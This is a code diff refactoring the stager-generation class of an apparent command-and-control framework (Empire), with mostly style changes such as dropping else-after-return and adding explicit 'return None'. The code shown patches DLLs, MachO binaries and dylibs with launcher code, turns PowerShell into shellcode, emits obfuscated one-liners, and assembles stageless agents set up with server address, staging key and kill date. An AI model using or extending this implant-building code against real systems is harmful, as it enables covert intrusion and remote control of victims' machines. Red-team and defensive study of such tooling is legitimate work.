@@ -59,8 +59,8 @@ class Stagers:
         )
         if encode:
             return helpers.powershell_launcher(stager, launcher)
-        else:
-            return stager
+
+        return stager
 
     def generate_launcher(  # noqa: PLR0913
         self,
@@ -115,6 +115,7 @@ class Stagers:
             )
             if launcher_code:
                 return launcher_code
+            return None
 
     def generate_dll(self, poshCode, arch):
         """
@@ -141,16 +142,15 @@ class Stagers:
                 # patch the dll with the new PowerShell code
                 searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                 index = dllRaw.find(searchString)
-                dllPatched = (
+                return (
                     dllRaw[:index]
                     + replacementCode
                     + dllRaw[(index + len(replacementCode)) :]
                 )
 
-                return dllPatched
-
         else:
             log.error(f"Original .dll for arch {arch} does not exist!")
+            return None
 
     def generate_powershell_exe(
         self, posh_code, dot_net_version="net40", obfuscate=False
@@ -178,8 +178,7 @@ class Stagers:
                 stager_yaml, "CSharpPS", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
-        return directory
+        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
 
     def generate_powershell_shellcode(
         self, posh_code, arch="both", dot_net_version="net40"
@@ -204,7 +203,7 @@ class Stagers:
         shellcode = donut.create(file=directory, arch=arch_type)
         return shellcode, None
 
-    def generate_exe_oneliner(  # noqa: PLR0913
+    def generate_exe_oneliner(
         self, language, obfuscate, obfuscation_command, encode, listener_name
     ):
         """
@@ -245,9 +244,8 @@ class Stagers:
             (not obfuscate) or ("launcher" not in obfuscation_command.lower())
         ):
             return helpers.powershell_launcher(launcher, launcher_front)
-        else:
-            # otherwise return the case-randomized stager
-            return launcher
+        # otherwise return the case-randomized stager
+        return launcher
 
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
@@ -275,8 +273,7 @@ class Stagers:
                 stager_yaml, "CSharpPy", confuse=obfuscate
             )
 
-        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
-        return directory
+        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
 
     def generate_python_shellcode(
         self, posh_code, arch="both", dot_net_version="net40"
@@ -343,13 +340,10 @@ class Stagers:
             )
             launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
             launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
-            patchedMachO = (
-                template[:offset] + launcher + template[(offset + len(launcher)) :]
-            )
+            return template[:offset] + launcher + template[(offset + len(launcher)) :]
 
-            return patchedMachO
-        else:
-            log.error("Unable to patch MachO binary")
+        log.error("Unable to patch MachO binary")
+        return None
 
     def generate_dylib(self, launcherCode, arch, hijacker):  # noqa: PLR0912
         """
@@ -399,15 +393,14 @@ class Stagers:
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             if isinstance(launcher, str):
                 launcher = launcher.encode("UTF-8")
-            patchedDylib = b"".join(
+            return b"".join(
                 [template[:offset], launcher, template[(offset + len(launcher)) :]]
             )
 
-            return patchedDylib
-        else:
-            log.error("Unable to patch dylib")
+        log.error("Unable to patch dylib")
+        return None
 
-    def generate_appbundle(  # noqa: PLR0915, PLR0913, PLR0912
+    def generate_appbundle(  # noqa: PLR0915, PLR0912
         self, launcherCode, Arch, icon, AppName, disarm
     ):
         """
@@ -567,8 +560,8 @@ class Stagers:
             os.remove("/tmp/launcher.zip")
             return zipbundle
 
-        else:
-            log.error("Unable to patch application")
+        log.error("Unable to patch application")
+        return None
 
     def generate_pkg(self, launcher, bundleZip, AppName):
         # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
@@ -654,8 +647,6 @@ class Stagers:
         except OSError as e:
             if e.errno != errno.EEXIST:
                 raise
-            else:
-                pass
 
         with open(jarpath + "Run.java", "w") as f:
             f.write(javacode)
@@ -696,9 +687,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         file_encoded = base64.b64encode(file).decode("UTF-8")
 
         script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
-        script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
-
-        return script
+        return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
     def generate_stageless(self, options):
         listener_name = options["Listener"]["Value"]
@@ -778,10 +767,9 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 
             if options["Language"]["Value"] == "powershell":
                 launch_code = f"\nInvoke-Empire -Servers @('{host}') -StagingKey '{staging_key}' -SessionKey '{session_key}' -SessionID '{session_id}' -WorkingHours '{working_hours}' -KillDate '{kill_date}';"
-                full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
-                return full_agent
+                return comms_code + "\n" + agent_code + "\n" + launch_code
 
-            elif options["Language"]["Value"] in ["python", "ironpython"]:
+            if options["Language"]["Value"] in ["python", "ironpython"]:
                 stager_code = stager_code.replace(
                     "return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))",
                     f"return b'{session_id}'",
@@ -797,6 +785,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 else:
                     full_agent = "\n".join([agent_code, stager_code, launch_code])
                 return full_agent
+            return None
 
 
 def replace_execute_function(code, session_key):
